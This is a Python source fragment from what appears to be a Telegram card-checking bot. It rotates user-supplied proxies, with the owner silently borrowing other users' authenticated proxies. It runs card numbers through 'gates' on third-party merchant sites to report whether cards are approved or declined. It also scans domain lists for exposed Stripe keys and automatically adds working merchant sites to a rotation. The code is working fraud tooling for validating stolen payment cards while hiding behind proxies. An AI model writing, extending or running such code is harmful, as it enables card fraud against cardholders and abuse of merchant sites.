        if user and pw:
            url = f"{protocol}://{quote(user, safe='')}:{quote(pw, safe='')}@{ip}:{port}"
        else:
            url = f"{protocol}://{ip}:{port}"
        return {'http': url, 'https': url, 'raw': clean}
    except Exception:
        return None
 
 
def get_user_proxy(chat_id) -> Optional[str]:
    data = load_user_proxies()
    ud = data.get(str(chat_id), {})
    if not ud:
        return None
    live = [p for p in ud.get('proxies', []) if p.get('status') == 'live']
    if live:
        raw = random.choice(live).get('proxy')
        url, _, _ = parse_proxy_enhanced(raw)
        return url or raw
    if ud.get('status') == 'dead':
        return None
    p = ud.get('proxy')
    if p:
        url, _, _ = parse_proxy_enhanced(p)
        return url or p
    return None
 
 
def remove_dead_proxy_for_user(chat_id, proxy_raw) -> bool:
    data = load_user_proxies()
    uid  = str(chat_id)
    if uid not in data:
        return False
    ud      = data[uid]
    updated = [p for p in ud.get('proxies', []) if p.get('proxy') != proxy_raw]
    ud['proxies'] = updated
    live = [p for p in updated if p.get('status') == 'live']
    dead = [p for p in updated if p.get('status') == 'dead']
    ud['live'] = len(live)
    ud['dead'] = len(dead)
    if updated:
        ud['proxy']  = live[0].get('proxy') if live else ''
        ud['status'] = 'live' if live else 'dead'
    else:
        del data[uid]
        return save_user_proxies(data)
    data[uid] = ud
    return save_user_proxies(data)
 
 
def is_valid_ip_or_host(text: str) -> bool:
    if not text:
        return False
    if all(c.isdigit() or c == '.' for c in text):
        parts = text.split('.')
        if len(parts) == 4:
            return all(p.isdigit() and 0 <= int(p) <= 255 for p in parts if p)
    if '.' in text and not text.startswith('.') and not text.endswith('.'):
        return True
    return text.replace('-', '').replace('_', '').isalnum()
 
 
def is_valid_port(text: str) -> bool:
    try:
        return 1 <= int(text) <= 65535
    except Exception:
        return False
 
 
def parse_proxy_line(line: str) -> Optional[Dict]:
    if not line:
        return None
    line = str(line).strip()
    if not line:
        return None
    protocol = 'http'
    for proto in ('http://', 'https://', 'socks4://', 'socks5://', 'socks://'):
        if line.lower().startswith(proto):
            protocol = proto.replace('://', '')
            line     = line[len(proto):]
            break
    # normalise separator
    for sep in ('|', ';', ',', ' '):
        if sep in line and ':' not in line:
            line = line.replace(sep, ':')
            break
    ip_port = user_pass = None
    try:
        if '@' in line:
            parts = line.split('@')
            if len(parts) == 2:
                left, right = parts[0].split(':'), parts[1].split(':')
                if is_valid_ip_or_host(left[0]) and len(left) >= 2 and is_valid_port(left[1]):
                    ip_port   = [left[0], left[1]]
                    user_pass = [right[0], ':'.join(right[1:])] if len(right) >= 2 else None
                elif is_valid_ip_or_host(right[0]) and len(right) >= 2 and is_valid_port(right[1]):
                    ip_port   = [right[0], right[1]]
                    user_pass = [left[0], ':'.join(left[1:])] if len(left) >= 2 else None
        else:
            parts = line.split(':')
            if len(parts) == 2 and is_valid_ip_or_host(parts[0]) and is_valid_port(parts[1]):
                ip_port = parts[:2]
            elif len(parts) == 4:
                if is_valid_ip_or_host(parts[0]) and is_valid_port(parts[1]):
                    ip_port, user_pass = parts[:2], parts[2:]
                elif is_valid_ip_or_host(parts[2]) and is_valid_port(parts[3]):
                    ip_port, user_pass = parts[2:], parts[:2]
                else:
                    ip_port, user_pass = parts[:2], parts[2:]
        if not ip_port or not is_valid_ip_or_host(ip_port[0]) or not is_valid_port(ip_port[1]):
            return None
        if user_pass and len(user_pass) >= 2 and user_pass[0] and user_pass[1]:
            url = f"{protocol}://{quote(str(user_pass[0]), safe='')}:{quote(str(user_pass[1]), safe='')}@{ip_port[0]}:{ip_port[1]}"
        else:
            url = f"{protocol}://{ip_port[0]}:{ip_port[1]}"
        return {'http': url, 'https': url, 'raw': line.strip(),
                'ip': ip_port[0], 'port': ip_port[1],
                'has_auth': bool(user_pass)}
    except Exception:
        return None
 
 
def _is_premium_proxy(proxy_str: str) -> bool:
    if not proxy_str:
        return False
    c = proxy_str.strip()
    if '://' in c:
        c = c.split('://', 1)[1]
    return '@' in c or len(c.split(':')) >= 4
 
 
def _get_all_premium_proxies(exclude_user=None) -> List[str]:
    out  = []
    data = load_user_proxies()
    for uid, ud in data.items():
        if exclude_user and str(uid) == str(exclude_user):
            continue
        for p in ud.get('proxies', []):
            raw = p.get('proxy', '')
            if p.get('status') == 'live' and _is_premium_proxy(raw):
                out.append(raw)
        top = ud.get('proxy', '')
        if top and _is_premium_proxy(top) and top not in out:
            out.append(top)
    return out
 
 
def get_proxy_for_request_global(chat_id=None) -> Optional[str]:
    if str(chat_id) == OWNER_ID:
        p = get_user_proxy(chat_id)
        if p:
            return p
        prem = _get_all_premium_proxies()
        return random.choice(prem) if prem else None
    if chat_id:
        return get_user_proxy(chat_id)
    return None
 
 
def get_proxy_for_request(chat_id=None) -> Optional[Dict]:
    raw = get_proxy_for_request_global(chat_id)
    if not raw:
        return None
    url, _, _ = parse_proxy_enhanced(raw)
    if url:
        return {'http': url, 'https': url, 'raw': raw}
    parsed = parse_proxy_line(raw)
    if parsed:
        return {'http': parsed['http'], 'https': parsed['https'], 'raw': raw}
    return None
 
 
# ══════════════════════════════════════════════════════════════════════════════
#  BOT INTERFACE
# ══════════════════════════════════════════════════════════════════════════════
 
def process_card_enhanced(domain, ccx, chat_id=None,
                           use_registration=True, received_proxy=None) -> Dict:
    proxy = parse_proxy_from_bot(received_proxy) if received_proxy else get_proxy_for_request(chat_id)
 
    # FIX 6: no proxy → go direct (proxy_dict=None) instead of hard-error
    proxy_dict = {'http': proxy['http'], 'https': proxy['https']} if proxy else None
 
    result      = hunter.process_single_gate(domain, ccx, proxy_dict, use_cache=True)
    raw_response = result.get('response', 'Unknown')
 
    if any(x in str(raw_response) for x in ('Registration failed', 'Site blocked')):
        for fb in get_all_sites():
            if fb != domain:
                result       = hunter.process_single_gate(fb, ccx, proxy_dict, use_cache=True)
                raw_response = result.get('response', 'Unknown')
                if not any(x in str(raw_response) for x in ('Registration failed', 'Site blocked')):
                    break
 
    status_map = {'APPROVED': 'Approved', 'FAILED': 'Declined', 'ERROR': 'Error'}
    return {
        'status':   status_map.get(result.get('status', 'ERROR'), 'Declined'),
        'response': _clean_response(raw_response, result.get('status', 'ERROR')),
    }
 
 
def _clean_response(raw, status: str) -> str:
    try:
        if isinstance(raw, str):
            try:
                data = json.loads(raw)
            except Exception:
                data = None
 
            if data and isinstance(data, dict):
                if status == 'APPROVED' or data.get('success') is True:
                    return 'Card added successfully 💯'
                err = data.get('data', {}).get('error', {})
                if isinstance(err, dict) and 'message' in err:
                    return err['message']
                if 'error' in data:
                    e = data['error']
                    return e['message'] if isinstance(e, dict) and 'message' in e else str(e)
 
            low = raw.lower()
            if status == 'APPROVED' or 'succeeded' in low or 'success' in low:
                return 'Card added successfully 💯'
            for kw, msg in (
                ('decline',        'Your card was declined.'),
                ('insufficient',   'Insufficient funds.'),
                ('expired',        'Your card has expired.'),
                ('incorrect cvc',  'Incorrect CVC.'),
                ('security code',  'Incorrect security code.'),
                ('lost',           'Card reported lost.'),
                ('stolen',         'Card reported stolen.'),
                ('processing',     'Processing error, try again.'),
                ('authentication', '3D Secure authentication required.'),
                ('3d',             '3D Secure authentication required.'),
            ):
                if kw in low:
                    return msg
        return raw or 'Unknown error'
    except Exception:
        return raw or 'Unknown error'
 
 
# ══════════════════════════════════════════════════════════════════════════════
#  SITE CHECK  — passive probe, no real card burned
# ══════════════════════════════════════════════════════════════════════════════
 
def check_site_status(domain: str, chat_id=None, received_proxy=None) -> Dict:
    """
    Passive gate probe using Stripe's always-decline test card 4000000000000002.
    Stripe tokenises it fine; the bank always declines — no charge, no fraud risk.
    Confirmed working gates are auto-added to sites_config.json.
    """
    domain = _normalize_domain(domain)
    proxy  = parse_proxy_from_bot(received_proxy) if received_proxy else get_proxy_for_request(chat_id)
 
    if not proxy:
        return {'status': 'error', 'message': 'No proxy available. Add proxy with /addproxy'}
 
    proxy_dict = {'http': proxy['http'], 'https': proxy['https']}
 
    # FIX 7: Stripe always-decline test card — never charges, confirms gate response
    _PROBE = '4000000000000002|01|2030|123'
 
    try:
        result   = hunter.process_single_gate(domain, _PROBE, proxy_dict, use_cache=False)
        st_raw   = result.get('status', 'ERROR')
        response = result.get('response', '')
        elapsed  = result.get('time', 0)
 
        cached      = hunter.load_gate_details(domain)
        has_pattern = bool(cached and cached.get('payment_pattern') and
                           cached['payment_pattern'].get('endpoint_url'))
        stripe_key  = cached.get('stripe_key', 'Not Found') if cached else 'Not Found'
 
        gate_alive = (
            st_raw in ('APPROVED', 'FAILED') and
            stripe_key != 'Not Found' and
            not any(x in response for x in ('No Stripe key', 'Cannot access', 'Proxy dead'))
        )
 
        if gate_alive:
            real_decline = any(x in response.lower() for x in (
                'decline', 'card', 'insufficient', 'expired', 'cvc',
                'security code', 'lost', 'stolen', 'succeeded', 'success',
            ))
            if real_decline or st_raw == 'APPROVED':
                add_site(domain)
 
            return {
                'status':        'success',
                'stripe_key':    stripe_key,
                'message':       '✅ Gate alive! Pattern saved. Auto-added to rotation.'
                                 if (real_decline or st_raw == 'APPROVED')
                                 else '⚠️ Gate reached but response unclear.',
                'gate_response': response,
                'pattern_saved': has_pattern,
                'time':          f'{elapsed:.1f}s',
                'auto_added':    real_decline or st_raw == 'APPROVED',
            }
 
        if stripe_key != 'Not Found':
            return {
                'status':        'partial',
                'stripe_key':    stripe_key,
                'message':       '🔑 Key found but gate did not respond — nonce or registration issue.',
                'gate_response': response,
                'pattern_saved': has_pattern,
                'time':          f'{elapsed:.1f}s',
                'auto_added':    False,
            }
 
        return {
            'status':        'failed',
            'stripe_key':    'Not Found',
            'message':       '❌ No Stripe key found or site unreachable.',
            'gate_response': response,
            'time':          f'{elapsed:.1f}s',
            'auto_added':    False,
        }
 
    except Exception as e:
        return {
            'status':        'error',
            'message':       f'Check error: {str(e)[:200]}',
            'gate_response': str(e),
            'auto_added':    False,
        }
 
 
# ══════════════════════════════════════════════════════════════════════════════
#  BULK SITE CHECK FROM .txt FILE
# ══════════════════════════════════════════════════════════════════════════════
 
def check_sites_from_file(file_path: str, chat_id=None, received_proxy=None,
                           max_workers: int = 3) -> Dict:
    """
    Read domains from file_path (one per line, # = comment).
    Runs check_site_status() on each in parallel.
    Auto-adds confirmed working gates to sites_config.json.
 
    Returns:
        {
          'total':   int,
          'alive':   [{domain, stripe_key, response}],
          'partial': [{domain, stripe_key, response}],
          'dead':    [domain],
          'added':   [domain],
          'errors':  [str],
        }
    """
    if not os.path.exists(file_path):
        return {'error': f'File not found: {file_path}'}
 
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        domains = []
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            d = _normalize_domain(line)
            if d and '.' in d:
                domains.append(d)
 
    domains = list(dict.fromkeys(domains))   # deduplicate, preserve order
    if not domains:
        return {'error': 'No valid domains found in file'}
 
    out: Dict = {
        'total': len(domains),
        'alive': [], 'partial': [], 'dead': [], 'added': [], 'errors': [],
    }
 
    def _one(d):
        return d, check_site_status(d, chat_id=chat_id, received_proxy=received_proxy)
 
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = {ex.submit(_one, d): d for d in domains}
        for future in as_completed(futures):
            d = futures[future]
            try:
                _, r = future.result()
                st   = r.get('status', 'error')
                rec  = {'domain': d, 'stripe_key': r.get('stripe_key', ''),
                        'response': r.get('gate_response', '')}
                if st == 'success':
                    out['alive'].append(rec)
                    if r.get('auto_added'):
                        out['added'].append(d)
                elif st == 'partial':
                    out['partial'].append(rec)
                elif st == 'error':
                    out['errors'].append(f"{d}: {r.get('message', '')}")
                else:
                    out['dead'].append(d)
            except Exception as e:
                out['errors'].append(f"{d}: {str(e)[:100]}")
 
    return out
